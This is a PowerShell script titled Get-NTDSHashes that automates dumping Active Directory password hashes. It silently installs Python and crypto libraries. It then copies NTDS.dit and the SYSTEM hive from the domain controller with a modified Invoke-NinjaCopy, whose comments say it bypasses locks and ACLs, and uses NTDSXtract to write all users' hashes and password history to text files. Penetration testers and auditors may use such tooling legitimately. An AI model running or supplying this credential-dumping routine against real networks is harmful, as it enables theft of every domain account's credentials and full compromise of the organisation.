Write-Host @"
   ______     __        _   ____________  _____ __  __           __             
  / ____/__  / /_      / | / /_  __/ __ \/ ___// / / /___ ______/ /_  ___  _____
 / / __/ _ \/ __/_____/  |/ / / / / / / /\__ \/ /_/ / __ '/ ___/ __ \/ _ \/ ___/
/ /_/ /  __/ /_/_____/ /|  / / / / /_/ /___/ / __  / /_/ (__  ) / / /  __(__  ) 
\____/\___/\__/     /_/ |_/ /_/ /_____//____/_/ /_/\__._/____/_/ /_/\___/____/  
                                                                                
"@ -fo green

Write-Host @"
`tWritten by: Tyler Applebaum
`tVersion 0.1 Aug 12 2014`n
`tA debt of gratitude is owed to: 
`tmubix at Room362.com - Inspiration for this project
`tJoachim Metz - libesedb
`tAndrew Kuchling & Christian Heimes - pycrypto
`tAaron Lerch - Set-ConsoleIcon.ps1
`tclymb3r - Invoke-NinjaCopy
`tCsaba Barta - NTDSXtract Framework
`ttjt1980 - DSHashes.py
`tPython contributors - Python
`tobscuresec - Get-PasswordFile.ps1`n
"@

Write-Host `t'Writing code has a place in the human hierarchy worth somewhere above grave robbing and beneath managing. - Gerald Weinberg'`n -fo magenta

$ErrorActionPreference = "Stop"

function script:AsAdmin {
$user = [Security.Principal.WindowsIdentity]::GetCurrent();
$admin = (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
	If ($admin){
	Write-Host "Powershell running as administrator, continuing" -fo green
	}
	Else {
	Write-Error "Please re-launch Powershell as an administrator"
	}
}#end AsAdmin

function script:FoofyShit {
$host.ui.RawUI.WindowTitle = "Get-NTDSHashes"
$Content = [System.Convert]::FromBase64String($(gc Icon\icon.txt))
Set-Content -Path $env:temp\ps.ico -Value $Content -Encoding Byte
#http://gallery.technet.microsoft.com/scriptcenter/9d476461-899f-4c98-9d63-03b99596c2c3
.\Icon\seticon.ps1 $env:temp\ps.ico
}#end FoofyShit

#Detect PS version
function script:PSVer {
$Ver = "$PSVersionTable.PSVersion.Major"
	If ($Ver -ge "3"){
	Write-Host "Powershell v3 or better detected, continuing" -fo green
	}
	ElseIf ($Ver -ge "2"){
	Write-Host "Powershell v2 detected, continuing" -fo green
	}
	Else {
	Write-Error "Outdated version of Powershell detected, exiting." 
	}
}#end PSVer

function script:WorkingDir {
#Set working directory to house SYSTEM and NTDS.dit files
#Perform cleanup if already found because Invoke-NinjaCopy will append to the NTDS and SYSTEM files if they exist.
$workingdir = "C:\ntdsfiles"
	If (!(test-path $workingdir)) {
	md $workingdir | Out-Null
	}
	Else {
	del $workingdir\*.* -force -recurse
	}
}#end WorkingDir

function Credentials {
$creds = Get-Credential $env:userdomain\$env:username
} #end Credentials

function script:Bitness {
	If ([System.IntPtr]::Size -eq 4){ 
	$Reg = get-itemproperty hklm:\software\microsoft\windows\currentversion\uninstall\*
	} 
	Else { 
	$Reg = get-itemproperty hklm:\software\wow6432node\microsoft\windows\currentversion\uninstall\*
	}
}#end Bitness

function Install-Python {
$InstallPython = cmd /c MsiExec.exe /qn /i 'Python\Python-2.7.8.msi' ALLUSERS=1
	If ($LastExitCode -eq '0'){
	Write-Host "Python successfully installed on $env:computername!" -fo green
	}
	Else {
	Write-Host "Install results: $InstallPython"
	Write-Host $LastExitCode -fore Red #Debugging purposes
	}
}#end Install-Python

function Install-PyCrypto {
$InstallPyCrypto = cmd /c MsiExec.exe /qn /i 'Python\pycrypto-2.6.win32-py2.7.msi'
	If ($LastExitCode -eq '0'){
	Write-Host "PyCrypto 2.6 successfully installed on $env:computername!" -fo green
	}
	Else {
	Write-Host "Install results: $InstallPyCrypto"
	Write-Host $LastExitCode -fore Red #Debugging purposes
	}
}#end Install-PyCrypto

function Install-MSVCR {
$InstallMSVCR = cmd /c 'VC++ 2012\vcredist_x86.exe' /q /norestart 
	If ($LastExitCode -eq '0'){
	Write-Host "Microsoft Visual C++ 2012 Redistributable - x86 successfully installed on $env:computername!" -fo green
	}
	Else {
	Write-Host "Install results: $InstallMSVCR"
	Write-Host $LastExitCode -fore Red #Debugging purposes
	}
}#end Install-MSVCR

function PythonCheck { 
#Check for Python 2.7.x installation
$Pycheck = $Reg | Select DisplayName | where { $_.DisplayName -match "Python 2.7*" -and $_.DisplayName -notlike "*pycrypto*"}
	If ($Pycheck.DisplayName -like "Python 2.7.*"){
	#Skip installing Python
	Write-Host "$($Pycheck.DisplayName) installation detected, continuing" -fo green
	}
	Else {
	Write-Host "Installing Python 2.7.8"
	. Install-Python
	}
}#end PythonCheck
 
function PyCryptoCheck {
#If you already have this installed...well, I don't know. This had to be repackaged as an MSI for a silent install and I'm very proud of it!
#Source: http://www.voidspace.org.uk/python/modules.shtml#pycrypto
$PyCryptoCheck = $Reg | Select DisplayName | where { $_.DisplayName -match "Python 2.7 pycrypto-2.6*"}
	If ($PyCryptoCheck.DisplayName -like "Python 2.7 pycrypto-2.6*"){
	#Skip installing PyCrypto
	Write-Host "$($PyCryptoCheck.DisplayName) installation detected, continuing" -fo green
	}
	Else {
	Write-Host "Installing PyCrypto 2.6"
	. Install-PyCrypto
	}
}#end PyCryptoCheck

function MSVCRCheck { 
#Check for Microsoft Visual Studio 2012 C++ Redistributable installation. I love that Powershell interprets the ++ in C++ as a 'nested quantifier', meaning we cannot use -match.
$MSVCRCheck = $Reg | Select DisplayName | where { $_.DisplayName -like "Microsoft Visual C`+`+ 2012 Redistributable (x86)*"}
	If ($MSVCRCheck.DisplayName -like "Microsoft Visual C`+`+ 2012 Redistributable (x86)*"){
	#Skip installing vcredist_x86.exe
	Write-Host "$($MSVCRCheck.DisplayName) installation detected, continuing" -fo green
	}
	Else {
	Write-Host "Installing vcredist_x86.exe"
	. Install-MSVCR
	}
}#end MSVCRCheck

function Path {
#Add Python Install dir to PATH
$pydir = "C:\python27" 
$oldPath = (Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH).Path
	If ($oldPath -notlike "*$pydir*"){
	$newPath = $oldPath+";$pydir"
	Set-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH –Value $newPath
	}
	Else {
	#Do nothing, python must already be in system path.
	}
}#end Path

function SelectDCAuto {
#Good spot to credit mubix:
#http://www.room362.com/blog/2013/06/10/volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/
#http://www.room362.com/blog/2013/06/11/volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/
$dc = $env:logonserver.trim("\\")
$dcip = [System.Net.Dns]::GetHostAddresses($dc).IPAddressToString
$OS = gwmi -class Win32_OperatingSystem -ComputerName $dc
}#end SelectDCAuto

function NinjaCopy {
$ErrorActionPreference = "continue" #We use GetPasswordFile as a contingency if NinjaCopy fails
#Invoke-NinjaCopy is pretty well-known now. What isn't well-known, is that in its original form, it does not work with .Net Framework 4.5.2. I have re-written a few tiny portions to make it work.
#Original source: http://clymb3r.wordpress.com/2013/06/13/using-powershell-to-copy-ntds-dit-registry-hives-bypass-sacls-dacls-file-locks/
#Source on updates to Invoke-NinjaCopy: http://support.microsoft.com/kb/2909958
$DomainRole = (Get-WmiObject Win32_ComputerSystem).DomainRole 
    if ($DomainRole -gt 3) { 
    $NTDSLocation = (Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\services\NTDS\Parameters)."DSA Database File" 
    } 
	else {
	$reg=[microsoft.win32.registrykey]::OpenRemoteBaseKey('LocalMachine',$dc)
	$regkey=$reg.OpenSubKey("SYSTEM\\CurrentControlSet\\services\\NTDS\\Parameters")
	$NTDSLocation = $regkey.GetValue("DSA Database File")
	} 
.\Invoke-NinjaCopy452.ps1 -Path $NTDSLocation -ComputerName $dc -LocalDestination $Workingdir\ntds.dit
.\Invoke-NinjaCopy452.ps1 -Path "$env:windir\system32\config\SYSTEM" -ComputerName $dc -LocalDestination $Workingdir\SYSTEM.hive
}#end NinjaCopy

function GetPasswordFile {
#source:http://gallery.technet.microsoft.com/scriptcenter/Get-PasswordFile-4bee091d/view/Reviews
$tempdir = "C:\temp" #Directory on remote DC to use
. .\Get-PasswordFile.ps1
Get-PasswordFile -d $tempdir
Copy-Item "\\$dc\c$\temp\SYSTEM.hive" $workingDir
Copy-Item "\\$dc\c$\temp\NTDS.dit" $workingDir
}

function ExportDB {
#Source: https://code.google.com/p/libesedb/
#The libesedb tools were compiled by me on a Windows 7 32-bit box with Visual Studio 2012.
cmd /c "libesedb\esedbexport.exe" "$workingdir\ntds.dit"
mv ntds.dit.export $workingdir #tried to use the -t option with esedbexport, didn't seem to work. Hence the mv.
}#end ExportDB

function DSUsers2k8 {
#http://www.ntdsxtract.com/
#https://code.google.com/p/ntdsxtract/
cmd /c "C:\Python27\python.exe" "NTDSXtract 1.0\dsusers.py" $workingDir\ntds.dit.export\datatable.3 $workingDir\ntds.dit.export\link_table.5 --passwordhashes $workingDir\SYSTEM.hive --passwordhistory $workingDir\SYSTEM.hive > $workingDir\hashes-humanreadable.txt
}#end DSUsers2k8

function DSUsers2k12 {
cmd /c "C:\Python27\python.exe" "NTDSXtract 1.0\dsusers.py" $workingDir\ntds.dit.export\datatable.4 $workingDir\ntds.dit.export\link_table.6 --passwordhashes $workingDir\SYSTEM.hive --passwordhistory $workingDir\SYSTEM.hive > $workingDir\hashes-humanreadable.txt
}#end DSUsers2k12

function DSUsers2k12R2 {
cmd /c "C:\Python27\python.exe" "NTDSXtract 1.0\dsusers.py" $workingDir\ntds.dit.export\datatable.4 $workingDir\ntds.dit.export\link_table.7 --passwordhashes $workingDir\SYSTEM.hive --passwordhistory $workingDir\SYSTEM.hive > $workingDir\hashes-humanreadable.txt
}#end DSUsers2k12R2

function DSHashes2k8 {
#https://code.google.com/p/ptscripts/source/browse/trunk/dshashes.py
cmd /c "C:\Python27\python.exe" "NTDSXtract 1.0\dshashes.py" $workingDir\ntds.dit.export\datatable.3 $workingDir\ntds.dit.export\link_table.5 --passwordhashes $workingDir\SYSTEM.hive > $workingDir\hashes.txt
}#end DSHashes2k8

function DSHashes2k12 {
cmd /c "C:\Python27\python.exe" "NTDSXtract 1.0\dshashes.py" $workingDir\ntds.dit.export\datatable.4 $workingDir\ntds.dit.export\link_table.6 --passwordhashes $workingDir\SYSTEM.hive > $workingDir\hashes.txt
}#end DSHashes2k12

function DSHashes2k12R2 {
cmd /c "C:\Python27\python.exe" "NTDSXtract 1.0\dshashes.py" $workingDir\ntds.dit.export\datatable.4 $workingDir\ntds.dit.export\link_table.7 --passwordhashes $workingDir\SYSTEM.hive > $workingDir\hashes.txt
}#end DSHashes2k12R2

. AsAdmin
. FoofyShit
. PSVer
. WorkingDir
. Credentials
. Bitness
. PythonCheck
. PyCryptoCheck
. MSVCRCheck
. Path
Write-Host "Prerequisite checks and background work complete! On to the hash dumping." -fo Green -ba black
. SelectDCAuto
. NinjaCopy
If (!(Test-Path "$workingDir\NTDS.dit")){
. GetPasswordFile
}
. ExportDB
If ($OS.Version -like '6.3*'){
. DSUsers2k12R2
. DSHashes2k12R2
}
Elseif ($OS.Version -like '6.2*'){
. DSUsers2k12
. DSHashes2k12
}
Elseif ($OS.Version -like '6.1*'){
. DSUsers2k8
. DSHashes2k8
}